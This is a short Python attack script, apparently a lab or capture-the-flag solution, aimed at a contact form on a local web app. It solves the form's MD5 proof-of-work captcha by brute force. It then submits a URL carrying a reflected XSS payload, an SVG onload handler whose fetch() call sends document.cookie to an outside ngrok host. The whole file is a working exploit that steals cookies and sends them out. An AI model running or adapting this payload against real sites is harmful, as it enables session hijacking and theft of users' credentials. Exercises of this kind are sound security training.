from requests import Session
import hashlib


def break_pow(text, zeros):
    i = 0
    print('Challenge:', text, '| Zeros:', zeros)
    while True:
        i += 1
        gen = hashlib.md5((text + str(i)).encode('utf-8'))
        if gen.hexdigest()[0:zeros] == '0' * zeros:
            print('Generated hash: ', gen.hexdigest())
            return str(i)

url = 'http://localhost:4000/contact'
sess = Session()
resp1 = sess.get(url)

pos = resp1.text.find('md5')
pos_substr = resp1.text.find('substr')

captcha = resp1.text[pos+5:pos+9]
zeros = resp1.text[pos_substr+10:pos_substr+11]

broke = break_pow(captcha, int(zeros))
print("Captcha answer:", broke)

post_data = {
    'url': 'http://localhost:4000/?xss=%3Csvg%20onload=%22fetch(%27http://dd77eda6.ngrok.io/?%27%2bdocument.cookie)%22%20/%3E',
    'pow': broke
}
print('Data posted: ', post_data)
print("")
resp2 = sess.post(url, data=post_data)
print(resp2.text)
